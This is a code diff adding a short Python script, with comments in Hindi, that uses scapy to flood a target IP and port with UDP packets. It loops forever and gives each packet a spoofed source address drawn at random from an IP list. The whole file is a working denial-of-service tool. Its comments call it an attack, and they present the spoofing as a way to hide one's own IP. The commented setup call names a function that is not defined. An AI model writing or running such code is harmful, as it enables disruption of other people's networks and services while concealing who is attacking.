@@ -1,0 +1,37 @@
+from scapy.all import IP, UDP, send, Raw
+import random
+import time
+
+# 1. आईपी लिस्ट लोड करें
+def load_ips():
+    with open("ips.txt", "r") as f:
+        return [line.strip() for line in f.readlines()]
+
+# 2. डेटा भेजने का फंक्शन (UDP Flood)
+def start_rotation_attack(target_ip, target_port):
+    ip_pool = load_ips()
+    # 1024 bytes का भारी डेटा
+    payload = "A" * 1024 
+
+    print(f"अटैक शुरू: टारगेट {target_ip} पर...")
+
+    try:
+        while True:
+            # अपनी आईडी/आईपी हटाकर लिस्ट से नई आईपी लगाना
+            spoofed_src = random.choice(ip_pool)
+            
+            # पैकेट निर्माण: src में आपकी नकली आईपी जाएगी
+            packet = IP(src=spoofed_src, dst=target_ip) / \
+                     UDP(sport=random.randint(1024, 65535), dport=target_port) / \
+                     Raw(load=payload)
+            
+            # पैकेट सेंड करना
+            send(packet, verbose=False)
+            print(f"Sent from: {spoofed_src}")
+
+    except KeyboardInterrupt:
+        print("\nअटैक रोक दिया गया।")
+
+# सेटअप भरें
+# target_ip = "टारगेट की आईपी"
+# start_stress_test(target_ip, 80)
